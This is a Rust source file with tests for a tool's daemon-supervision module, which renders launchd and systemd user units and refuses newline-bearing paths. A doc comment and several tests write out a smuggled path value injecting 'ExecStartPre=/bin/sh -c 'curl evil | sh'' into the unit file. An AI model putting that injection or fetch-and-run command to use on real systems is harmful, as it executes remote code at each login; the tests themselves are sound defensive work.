//! `lev daemon install` / `lev daemon uninstall` - hand the daemon to the OS
//! supervisor so it comes back by itself after a crash.
//!
//! Without supervision, nothing restarts the daemon when it dies: a
//! long-running agent simply stops, and the next `lev run` is the only thing
//! that brings the daemon back. Registering a launchd agent (macOS) or a systemd *user*
//! unit (Linux) with a restart policy closes that gap - and on the next start
//! the daemon's own recovery pass reloads every interrupted run.
//!
//! This module is the tested core: rendering the unit file, resolving where it
//! goes, writing/removing it, and building the activation command line. Running
//! that command is real subprocess I/O and lives in the binary.
//!
//! Platform differences are `#[cfg]`-gated rather than branched at runtime, so
//! each target compiles exactly the code it uses (and covers all of it).

use std::path::{Path, PathBuf};

use anyhow::{Context, Result};

/// The reverse-DNS label both platforms key the service by.
pub const SERVICE_LABEL: &str = "dev.leviath.daemon";

/// Labels earlier releases registered the launchd agent under (the project
/// predates its move off the Sun Forge organization). Install and uninstall
/// also deregister these, so upgrading across the rename cannot leave a
/// second supervised daemon running under the old name.
#[cfg(target_os = "macos")]
pub const LEGACY_SERVICE_LABELS: &[&str] = &["ai.sunforge.leviath"];

/// The cleanup a legacy label needs: the unit file it wrote and the
/// `launchctl bootout` that deregisters it. Pure data - running the commands
/// is the caller's subprocess I/O, same split as [`ServiceUnit`].
#[cfg(target_os = "macos")]
pub fn legacy_cleanup(config_home: &Path, uid: u32) -> Vec<(PathBuf, (String, Vec<String>))> {
    LEGACY_SERVICE_LABELS
        .iter()
        .map(|label| {
            (
                config_home.join(format!("{label}.plist")),
                (
                    "launchctl".to_string(),
                    vec!["bootout".to_string(), format!("gui/{uid}/{label}")],
                ),
            )
        })
        .collect()
}

/// Where a supervised daemon's stdout/stderr are appended, under the leviath
/// home directory. Only the platforms with a supervisor render a unit file.
#[cfg(any(target_os = "macos", target_os = "linux"))]
const LOG_FILE: &str = "daemon.log";

/// A rendered service definition and where it belongs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ServiceUnit {
    /// Absolute path the unit file is written to.
    pub path: PathBuf,
    /// The file's contents.
    pub contents: String,
    /// Command + args that tell the supervisor to pick it up.
    pub activate: (String, Vec<String>),
    /// Command + args that tell the supervisor to let it go.
    pub deactivate: (String, Vec<String>),
}

// ── macOS: a launchd user agent ──────────────────────────────────────────────

/// Build the service definition for this platform.
///
/// `exe` is the absolute path to the `lev` binary, `home` the leviath home
/// directory (the unit points the daemon at it explicitly, since a supervised
/// process inherits none of the user's shell environment), `config_home` the
/// directory the unit file is written into, and `uid` the user's numeric id
/// (launchd addresses per-user domains by it).
#[cfg(target_os = "macos")]
pub fn service_unit(exe: &Path, home: &Path, config_home: &Path, uid: u32) -> Result<ServiceUnit> {
    let path = config_home.join(format!("{SERVICE_LABEL}.plist"));
    Ok(ServiceUnit {
        contents: launchd_plist(exe, home, &home.join(LOG_FILE)),
        activate: (
            "launchctl".to_string(),
            vec![
                "bootstrap".to_string(),
                format!("gui/{uid}"),
                display(&path),
            ],
        ),
        deactivate: (
            "launchctl".to_string(),
            vec!["bootout".to_string(), format!("gui/{uid}/{SERVICE_LABEL}")],
        ),
        path,
    })
}

/// Where the unit file goes, relative to the user's home directory.
#[cfg(target_os = "macos")]
pub fn config_home(user_home: &Path) -> Result<PathBuf> {
    Ok(user_home.join("Library").join("LaunchAgents"))
}

/// A launchd user agent that starts the daemon at login and restarts it
/// whenever it exits - including the `abort()` this issue was about.
#[cfg(target_os = "macos")]
fn launchd_plist(exe: &Path, home: &Path, log: &Path) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
        <string>daemon</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>LEVIATH_HOME</key>
        <string>{home}</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ThrottleInterval</key>
    <integer>10</integer>
    <key>StandardOutPath</key>
    <string>{log}</string>
    <key>StandardErrorPath</key>
    <string>{log}</string>
</dict>
</plist>
"#,
        label = SERVICE_LABEL,
        exe = xml_escape(&display(exe)),
        home = xml_escape(&display(home)),
        log = xml_escape(&display(log)),
    )
}

/// Escape the five XML metacharacters so an odd path can't break the plist.
#[cfg(target_os = "macos")]
fn xml_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&apos;"),
            _ => out.push(c),
        }
    }
    out
}

// ── Linux: a systemd user unit ───────────────────────────────────────────────

/// Build the service definition for this platform (see the macOS variant for
/// the argument contract; `uid` is unused here - systemd's `--user` mode
/// already addresses the calling user's manager).
#[cfg(target_os = "linux")]
pub fn service_unit(exe: &Path, home: &Path, config_home: &Path, _uid: u32) -> Result<ServiceUnit> {
    Ok(ServiceUnit {
        path: config_home.join("leviath.service"),
        contents: systemd_unit(exe, home, &home.join(LOG_FILE))?,
        activate: (
            "systemctl".to_string(),
            vec![
                "--user".to_string(),
                "enable".to_string(),
                "--now".to_string(),
                "leviath.service".to_string(),
            ],
        ),
        deactivate: (
            "systemctl".to_string(),
            vec![
                "--user".to_string(),
                "disable".to_string(),
                "--now".to_string(),
                "leviath.service".to_string(),
            ],
        ),
    })
}

/// Where the unit file goes, relative to the user's home directory.
#[cfg(target_os = "linux")]
pub fn config_home(user_home: &Path) -> Result<PathBuf> {
    Ok(user_home.join(".config").join("systemd").join("user"))
}

/// Reject a value that cannot be safely interpolated into a systemd unit file.
///
/// A unit file is line-oriented `Key=Value`, so a newline in an interpolated
/// value starts a **new directive**. `home` derives from `LEVIATH_HOME`, so a
/// value like `/tmp\nExecStartPre=/bin/sh -c 'curl evil | sh'` injected an
/// arbitrary command that then ran at every login. The macOS plist path is
/// XML-escaped and was never exposed to this; the systemd path had no escaping
/// at all.
///
/// Refusing is right rather than escaping: systemd has no general quoting for
/// this position, and no legitimate path contains a newline.
///
/// Not `#[cfg(target_os = "linux")]` even though only the Linux path calls it:
/// it is pure string logic, and gating it would mean the check could only be
/// exercised on one platform's CI runner. A security control should be testable
/// wherever the tests run.
///
/// `pub` (in an already-public module) rather than private-plus-`allow(dead_code)`:
/// on a non-Linux build nothing calls it, and suppressing the warning would be
/// hiding the fact rather than stating it. It is genuinely part of this module's
/// surface - the systemd renderer's input contract.
pub fn unit_safe(label: &str, value: &Path) -> Result<String> {
    let s = display(value);
    if s.contains('\n') || s.contains('\r') {
        anyhow::bail!(
            "refusing to write a systemd unit: the {label} path contains a newline, \
             which would inject additional unit directives"
        );
    }
    Ok(s)
}

/// A systemd *user* unit (no root needed) with the same restart policy.
///
/// Compiled on every platform (it is pure string assembly) so its tests run
/// everywhere; only the caller that installs it is Linux-gated.
pub fn systemd_unit(exe: &Path, home: &Path, log: &Path) -> Result<String> {
    let exe = unit_safe("executable", exe)?;
    let home = unit_safe("LEVIATH_HOME", home)?;
    let log = unit_safe("log", log)?;
    Ok(format!(
        "[Unit]\n\
         Description=Leviath shared-world agent daemon\n\
         After=network-online.target\n\
         \n\
         [Service]\n\
         Type=simple\n\
         ExecStart={exe} daemon\n\
         Environment=LEVIATH_HOME={home}\n\
         Restart=always\n\
         RestartSec=10\n\
         StandardOutput=append:{log}\n\
         StandardError=append:{log}\n\
         \n\
         [Install]\n\
         WantedBy=default.target\n",
    ))
}

// ── Everywhere else: no supported user-level supervisor ──────────────────────

/// The error shown on a platform with no supported user-level supervisor.
#[cfg(not(any(target_os = "macos", target_os = "linux")))]
const UNSUPPORTED: &str = "`lev daemon install` supports macOS (launchd) and Linux (systemd user \
                           units); on this platform, start `lev daemon` from your own login script";

/// No user-level supervisor is wired up for this platform.
#[cfg(not(any(target_os = "macos", target_os = "linux")))]
pub fn service_unit(
    _exe: &Path,
    _home: &Path,
    _config_home: &Path,
    _uid: u32,
) -> Result<ServiceUnit> {
    anyhow::bail!(UNSUPPORTED)
}

/// No user-level supervisor is wired up for this platform.
#[cfg(not(any(target_os = "macos", target_os = "linux")))]
pub fn config_home(_user_home: &Path) -> Result<PathBuf> {
    anyhow::bail!(UNSUPPORTED)
}

// ── Platform-independent ─────────────────────────────────────────────────────

/// Write `unit` to disk, creating its parent directory. Returns the path.
pub fn install(unit: &ServiceUnit) -> Result<&Path> {
    if let Some(parent) = unit.path.parent() {
        std::fs::create_dir_all(parent)
            .with_context(|| format!("creating {}", parent.display()))?;
    }
    std::fs::write(&unit.path, &unit.contents)
        .with_context(|| format!("writing {}", unit.path.display()))?;
    Ok(&unit.path)
}

/// Remove the unit file. Returns whether there was one to remove.
pub fn uninstall(unit: &ServiceUnit) -> Result<bool> {
    match std::fs::remove_file(&unit.path) {
        Ok(()) => Ok(true),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(false),
        Err(e) => Err(e).with_context(|| format!("removing {}", unit.path.display())),
    }
}

/// The line `lev daemon status` adds about supervision.
pub fn format_supervision(installed: bool, path: &Path) -> String {
    if installed {
        format!("supervised: yes ({})", path.display())
    } else {
        "supervised: no (`lev daemon install` restarts it automatically)".to_string()
    }
}

/// A path as a string, lossily - these are user home paths, valid UTF-8 in
/// every case that matters, and a lossy rendering beats failing.
///
/// Not gated to the platforms with a supervisor, even though only they build a
/// unit file: `unit_safe` is unconditional (see its own note), and a helper it
/// calls cannot be narrower than its caller. Gating it broke the Windows build
/// outright.
fn display(path: &Path) -> String {
    path.to_string_lossy().into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A unit that needs no platform support to construct, for the shared
    /// filesystem helpers.
    fn bare_unit(path: PathBuf) -> ServiceUnit {
        ServiceUnit {
            path,
            contents: "unit body\n".to_string(),
            activate: ("sup".to_string(), vec!["on".to_string()]),
            deactivate: ("sup".to_string(), vec!["off".to_string()]),
        }
    }

    #[test]
    fn install_writes_then_uninstall_removes_exactly_once() {
        let dir = tempfile::tempdir().unwrap();
        let unit = bare_unit(dir.path().join("nested").join("leviath.unit"));

        let written = install(&unit).unwrap().to_path_buf();
        assert_eq!(std::fs::read_to_string(&written).unwrap(), unit.contents);
        assert!(uninstall(&unit).unwrap(), "first removal reports a removal");
        assert!(
            !uninstall(&unit).unwrap(),
            "second is a no-op, not an error"
        );
    }

    #[test]
    fn install_and_uninstall_surface_io_errors() {
        let dir = tempfile::tempdir().unwrap();
        // A file where the parent directory should be ⇒ create_dir_all fails.
        let blocker = dir.path().join("blocker");
        std::fs::write(&blocker, "x").unwrap();
        assert!(install(&bare_unit(blocker.join("child").join("unit"))).is_err());

        // A *directory* where the unit file should be: the parent exists, so
        // create_dir_all succeeds and the write itself is what fails.
        let occupied = dir.path().join("occupied");
        std::fs::create_dir(&occupied).unwrap();
        assert!(install(&bare_unit(occupied.clone())).is_err());

        // Removing a directory as if it were the unit file is a real error,
        // distinct from "there was nothing to remove".
        assert!(uninstall(&bare_unit(occupied)).is_err());

        // A path with no parent directory to create (the `if let` falls through
        // straight to the write, which then fails on the empty path).
        assert!(install(&bare_unit(PathBuf::new())).is_err());
    }

    #[test]
    fn supervision_status_reads_both_ways() {
        let path = Path::new("/home/u/unit");
        assert!(format_supervision(true, path).contains("yes"));
        assert!(format_supervision(true, path).contains("/home/u/unit"));
        assert!(format_supervision(false, path).contains("no"));
    }

    // ── Platforms with a supervisor ──────────────────────────────────────────

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    mod supported {
        use super::*;

        fn unit() -> ServiceUnit {
            service_unit(
                Path::new("/usr/local/bin/lev"),
                Path::new("/home/u/.leviath"),
                Path::new("/tmp/lev-units"),
                501,
            )
            .expect("this platform has a supervisor")
        }

        #[test]
        fn the_unit_restarts_the_daemon_and_points_it_at_the_leviath_home() {
            let u = unit();
            assert!(u.contents.contains("/usr/local/bin/lev"));
            assert!(u.contents.contains("/home/u/.leviath"));
            assert!(u.contents.contains(LOG_FILE));
            // Activation and deactivation drive the same supervisor.
            assert_eq!(u.activate.0, u.deactivate.0);
            assert!(!u.activate.1.is_empty() && !u.deactivate.1.is_empty());
            assert!(u.path.starts_with("/tmp/lev-units"));
            // The unit file lives under the user's home.
            let home = config_home(Path::new("/home/u")).expect("this platform has a supervisor");
            assert!(home.starts_with("/home/u"));
        }
    }

    #[cfg(target_os = "macos")]
    mod macos {
        use super::*;

        #[test]
        fn paths_with_xml_metacharacters_are_escaped() {
            assert_eq!(
                xml_escape("a&b<c>d\"e'f"),
                "a&amp;b&lt;c&gt;d&quot;e&apos;f"
            );
            assert_eq!(xml_escape("plain/path"), "plain/path");
        }

        #[test]
        fn it_is_a_launchd_plist_bootstrapped_into_the_gui_domain() {
            let u = service_unit(
                Path::new("/usr/local/bin/lev"),
                Path::new("/home/u/.leviath"),
                Path::new("/tmp/lev-units"),
                501,
            )
            .unwrap();
            assert_eq!(
                u.path.file_name().unwrap().to_string_lossy(),
                format!("{SERVICE_LABEL}.plist")
            );
            assert_eq!(u.activate.1[0], "bootstrap");
            assert_eq!(u.activate.1[1], "gui/501");
            assert_eq!(u.deactivate.1[1], format!("gui/501/{SERVICE_LABEL}"));
            // The whole point: launchd brings the daemon back after a crash.
            assert!(u.contents.contains("<key>KeepAlive</key>"));
            assert!(u.contents.contains("<key>RunAtLoad</key>"));
            assert!(
                config_home(Path::new("/home/u"))
                    .unwrap()
                    .ends_with("LaunchAgents")
            );
        }

        #[test]
        fn legacy_cleanup_covers_every_old_label_with_a_bootout_and_a_plist() {
            let actions = legacy_cleanup(Path::new("/tmp/lev-units"), 501);
            assert_eq!(actions.len(), LEGACY_SERVICE_LABELS.len());
            let (path, (cmd, args)) = &actions[0];
            assert_eq!(
                path.file_name().unwrap().to_string_lossy(),
                "ai.sunforge.leviath.plist"
            );
            assert_eq!(cmd, "launchctl");
            assert_eq!(args[0], "bootout");
            assert_eq!(args[1], "gui/501/ai.sunforge.leviath");
            // The rename is only safe because the old label is cleaned up;
            // the current label must never appear in the legacy list.
            assert!(!LEGACY_SERVICE_LABELS.contains(&SERVICE_LABEL));
        }
    }

    #[cfg(target_os = "linux")]
    mod linux {
        use super::*;

        #[test]
        fn it_is_a_systemd_user_unit_enabled_for_the_calling_user() {
            let u = service_unit(
                Path::new("/usr/local/bin/lev"),
                Path::new("/home/u/.leviath"),
                Path::new("/tmp/lev-units"),
                501,
            )
            .unwrap();
            assert_eq!(u.path.file_name().unwrap(), "leviath.service");
            assert_eq!(
                u.activate.1,
                ["--user", "enable", "--now", "leviath.service"]
            );
            assert_eq!(
                u.deactivate.1,
                ["--user", "disable", "--now", "leviath.service"]
            );
            // The whole point: systemd brings the daemon back after a crash.
            assert!(u.contents.contains("Restart=always"));
            assert!(u.contents.contains("WantedBy=default.target"));
            assert!(config_home(Path::new("/home/u")).unwrap().ends_with("user"));
        }

        /// The refusal has to be reachable through `service_unit`, not only
        /// through `systemd_unit` directly: this is the Linux-only call site,
        /// and `LEVIATH_HOME` is the value an attacker controls.
        ///
        /// It needs its own test because the propagation only exists on Linux -
        /// on macOS this function is not compiled, so a macOS-only coverage run
        /// cannot see the arm at all. That is exactly how it was missed.
        #[test]
        fn a_newline_in_leviath_home_is_refused_at_the_call_site() {
            let err = service_unit(
                Path::new("/usr/local/bin/lev"),
                Path::new("/tmp/x\nExecStartPre=/bin/sh -c 'curl evil | sh'"),
                Path::new("/tmp/lev-units"),
                501,
            )
            .expect_err("a newline in the home path must not reach the unit file");
            assert!(err.to_string().contains("LEVIATH_HOME"), "{err}");
        }
    }

    /// The systemd unit builder is pure string assembly, so these run on every
    /// platform rather than only on a Linux CI runner.
    mod systemd_unit_file {
        use super::*;

        #[test]
        fn display_renders_a_path_losslessly_when_it_can() {
            assert_eq!(display(Path::new("/a/b")), "/a/b");
        }

        #[test]
        fn it_renders_the_expected_directives() {
            let unit = systemd_unit(
                Path::new("/usr/local/bin/lev"),
                Path::new("/home/u/.leviath"),
                Path::new("/home/u/.leviath/daemon.log"),
            )
            .unwrap();
            assert!(unit.contains("ExecStart=/usr/local/bin/lev daemon"));
            assert!(unit.contains("Environment=LEVIATH_HOME=/home/u/.leviath"));
            assert!(unit.contains("Restart=always"));
        }

        /// A unit file is line-oriented `Key=Value`, so a newline in an
        /// interpolated path starts a new *directive*. `home` derives from
        /// `LEVIATH_HOME`, so this wrote an `ExecStartPre=` that then ran at
        /// every login. There is no general quoting for this position in
        /// systemd, so the value is refused rather than escaped - and no
        /// legitimate path contains a newline.
        #[test]
        fn a_newline_in_an_interpolated_path_is_refused() {
            let evil = Path::new("/home/u/.leviath\nExecStartPre=/bin/sh -c 'curl evil | sh'");
            let err = systemd_unit(
                Path::new("/usr/local/bin/lev"),
                evil,
                Path::new("/home/u/.leviath/daemon.log"),
            )
            .expect_err("a newline in LEVIATH_HOME must be refused");
            assert!(err.to_string().contains("newline"), "got: {err}");
            assert!(err.to_string().contains("LEVIATH_HOME"), "got: {err}");
        }

        /// Each interpolated position is checked, not just the first.
        #[test]
        fn every_interpolated_path_is_checked() {
            let evil = Path::new("/x\nExecStartPre=/bin/false");
            let good = Path::new("/home/u/.leviath");
            assert!(systemd_unit(evil, good, good).is_err(), "executable");
            assert!(systemd_unit(good, evil, good).is_err(), "home");
            assert!(systemd_unit(good, good, evil).is_err(), "log");
        }

        /// A carriage return is a line break too - systemd tolerates CRLF.
        #[test]
        fn a_carriage_return_is_refused_too() {
            assert!(
                systemd_unit(
                    Path::new("/usr/local/bin/lev"),
                    Path::new("/home/u/.leviath\rExecStartPre=/bin/false"),
                    Path::new("/home/u/.leviath/daemon.log"),
                )
                .is_err()
            );
        }
    }

    // ── Platforms without one ────────────────────────────────────────────────

    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    mod unsupported {
        use super::*;

        #[test]
        fn install_is_refused_with_an_actionable_message() {
            let err = service_unit(
                Path::new("lev.exe"),
                Path::new("home"),
                Path::new("units"),
                0,
            )
            .unwrap_err()
            .to_string();
            assert!(err.contains("macOS"), "got: {err}");
            assert!(err.contains("lev daemon"), "got: {err}");
            assert!(config_home(Path::new("home")).is_err());
        }
    }
}
